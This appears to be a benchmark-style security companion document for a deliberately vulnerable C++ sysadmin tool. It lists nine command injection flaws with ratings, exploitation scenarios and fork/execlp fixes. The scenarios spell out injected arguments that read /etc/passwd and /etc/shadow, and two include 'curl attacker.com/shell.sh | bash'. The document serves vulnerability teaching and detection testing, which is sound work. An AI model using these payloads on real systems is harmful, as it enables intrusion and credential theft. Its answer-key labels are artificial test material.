# Security Companion Document: main.cpp

## Vulnerability: Direct Command Injection via popen in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L47-L49  

### Description
The `ping_host` function constructs a shell command by directly concatenating the user-supplied `host` argument into a string using the `+` operator, then passes it to `exec_command()` which calls `popen()`. The `host` value comes directly from `argv[2]` without any sanitization or validation.

### Exploitation Scenario
An attacker runs `./sysadmin ping "127.0.0.1; cat /etc/passwd"`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents. If the binary has elevated privileges, this could lead to privilege escalation.

### Remediation Guidance
Avoid shell interpretation by using `fork`/`execvp`:
```cpp
void ping_host(const std::string &host) {
    pid_t pid = fork();
    if (pid == 0) {
        execlp("ping", "ping", "-c", "3", host.c_str(), nullptr);
        _exit(1);
    }
    waitpid(pid, nullptr, 0);
}
```

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into string concatenation and then to `popen()` via `exec_command()`, a textbook command injection pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `popen()` with user-controlled string concatenation is a well-known dangerous pattern that C++ SAST tools (cppcheck, clang-tidy, Semgrep) flag reliably.

---

## Vulnerability: Command Injection via popen in DNS Lookup

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L58-L60  

### Description
The `dns_lookup` function constructs a shell command by concatenating the `domain` argument into a `dig` command string, then passes it to `exec_command()` which calls `popen()`. Although the `record_type` parameter is validated against a vector of valid DNS record types, the `domain` parameter is embedded directly without sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin dns "example.com; id"`. The `domain` value is interpolated into the shell command as `dig A example.com; id +short`, causing the shell to execute both `dig` and `id`.

### Remediation Guidance
Use `fork`/`execvp` with separate arguments:
```cpp
execlp("dig", "dig", record_type.c_str(), domain.c_str(), "+short", nullptr);
```

### Complexity Rationale
This is rated Moderate because the `record_type` parameter is validated against an allowlist, which may create a false sense of security. A reviewer must recognize that the `domain` parameter bypasses this validation.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the data flow from `argv` through the dispatch logic into `dns_lookup` and recognize that only one of two parameters is validated.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L72  

### Description
The `search_logs` function constructs a shell pipeline command by concatenating three user-controlled parameters: `lines`, `log_path` (derived from `logfile`), and `keyword`. All three are concatenated into a `tail | grep` pipeline and passed to `exec_command()` which calls `popen()`. The `keyword` is wrapped in single quotes, but this provides no real protection. The function also performs an `access()` check on the log path, but this does not prevent command injection.

### Exploitation Scenario
An attacker runs `./sysadmin logs "error'; id #" syslog 100`. The single quote breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest.

### Remediation Guidance
Avoid shell pipelines. Use `fork`/`exec` with separate commands and pipe output programmatically.

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, the single-quote wrapping creates a false appearance of sanitization, and the `access()` check may give a false sense of input validation.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization and the `access()` check, make this difficult for SAST tools to fully analyze.

---

## Vulnerability: Command Injection via popen in Disk Info

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L84-L86  

### Description
The `disk_info` function constructs a shell command by concatenating the user-supplied `path` argument into a `df` command string, then passes it to `exec_command()` which calls `popen()`. The `path` value comes directly from `argv[2]` without any sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin diskinfo "/; cat /etc/shadow"`. The path value is interpolated into the `df` command, and the shell executes the injected command.

### Remediation Guidance
Use `fork`/`execvp` with separate arguments:
```cpp
execlp("df", "df", "-h", path.c_str(), nullptr);
```

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into string concatenation and then to `popen()` with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `popen()` with user-controlled string concatenation is a standard pattern that SAST tools flag reliably.

---

## Vulnerability: Command Injection via popen in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L97-L99  

### Description
The `archive_path` function constructs a shell command by concatenating the `filepath` argument into a `tar` command string, then passes it to `exec_command()` which calls `popen()`. While the `name` parameter undergoes sanitization via `sanitize_name()` (replacing `/` and `\` with `_`), the `filepath` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker runs `./sysadmin archive "/tmp/data; curl attacker.com/shell.sh | bash" backup`. The `filepath` value is interpolated into the `tar` command, and the shell executes the injected commands.

### Remediation Guidance
Use `fork`/`execvp` with argument lists:
```cpp
execlp("tar", "tar", "czf", archive.c_str(), filepath.c_str(), nullptr);
```

### Complexity Rationale
This is rated Moderate because the adjacent `name` parameter has sanitization via `sanitize_name()`, which may create a false sense of security. A reviewer must recognize that `filepath` bypasses the sanitization.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the presence of the `sanitize_name()` function may cause SAST tools to reduce severity, and tools need to track which parameters are sanitized and which are not.

---

## Vulnerability: Command Injection via popen in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L109-L111  

### Description
The `check_port` function constructs a shell command by concatenating the `host` and `port` arguments into a `nc` (netcat) command string, then passes it to `exec_command()` which calls `popen()`. While the `port` parameter undergoes integer validation via `std::stoi()` and range checking, the `host` parameter is embedded directly without sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin netcheck "127.0.0.1; whoami" 80`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`.

### Remediation Guidance
Use `fork`/`execvp` with argument lists:
```cpp
execlp("nc", "nc", "-zv", "-w", "3", host.c_str(), port.c_str(), nullptr);
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has integer validation, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from `argv` to `popen()` via string concatenation is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Direct Command Injection via popen in WHOIS Lookup

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L131  

### Description
The `whois_lookup` function constructs a shell command by directly concatenating the user-supplied `domain` argument into a string using the `+` operator, then passes it to `exec_command()` which calls `popen()`. The `domain` value comes directly from `argv[2]` without any sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin whois "example.com; id"`. The semicolon terminates the `whois` command and executes `id`, returning the current user information.

### Remediation Guidance
Use `fork`/`execvp` with separate arguments:
```cpp
execlp("whois", "whois", domain.c_str(), nullptr);
```

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into string concatenation and then to `popen()`, identical to the ping vulnerability pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `popen()` with user-controlled string concatenation is a well-known dangerous pattern.

---

## Vulnerability: Direct Command Injection via popen in Traceroute

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L148-L149  

### Description
The `traceroute_host` function constructs a shell command by directly concatenating the user-supplied `host` argument into a string, then passes it to `exec_command()` which calls `popen()`. The `host` value comes directly from `argv[2]` without any sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin traceroute "127.0.0.1; id"`. The semicolon terminates the `traceroute` command and executes `id`.

### Remediation Guidance
Use `fork`/`execvp` with separate arguments:
```cpp
execlp("traceroute", "traceroute", "-m", "15", host.c_str(), nullptr);
```

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into string concatenation and then to `popen()` with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `popen()` with user-controlled string concatenation is a standard pattern that SAST tools flag reliably.

---

## Vulnerability: Arbitrary Command Execution in Interactive Mode

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L168  

### Description
The `interactive_mode` function reads user input from stdin via `std::getline()` and passes it directly to `exec_command()` which calls `popen()`. This creates an unrestricted command execution interface where any input is executed as a shell command. While this appears intentional as a "diagnostics mode," it provides no access control, authentication, or command filtering.

### Exploitation Scenario
If the binary is accessible to unauthorized users (e.g., via a web shell, SSH access, or setuid permissions), an attacker can execute arbitrary commands by entering them at the `diag>` prompt. For example, entering `cat /etc/shadow` or `curl attacker.com/shell.sh | bash` would execute without restriction.

### Remediation Guidance
Implement a command allowlist that restricts interactive mode to specific diagnostic commands:
```cpp
std::set<std::string> allowed = {"hostname", "uptime", "df", "free", "uname"};
if (allowed.find(input) == allowed.end()) {
    std::cout << "Command not allowed\n";
    continue;
}
```

### Complexity Rationale
This is rated Nuanced because the vulnerability appears to be an intentional feature (interactive diagnostics), making it easy to overlook during code review. The function reads from stdin and passes to `popen()` through the `exec_command()` helper, adding indirection.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools may not flag this as a vulnerability since the input comes from stdin rather than a network source. The interactive mode pattern may be considered intentional functionality, and the indirection through `exec_command()` may confuse taint analysis.
